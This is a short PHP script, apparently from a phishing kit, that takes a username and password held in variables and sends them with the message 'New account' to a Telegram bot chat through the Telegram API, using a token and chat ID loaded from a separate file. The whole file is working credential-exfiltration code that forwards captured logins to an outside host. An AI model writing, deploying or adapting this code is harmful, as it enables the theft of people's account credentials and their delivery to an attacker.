<?php
include 'tokenandchatid.php';
    $data = [
        'text' => ' 
New account. 

Username: '.$blind.'
Password: '.$blindP.'
      ',
  'chat_id' => $chat_id
    ];
    
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );


  
?>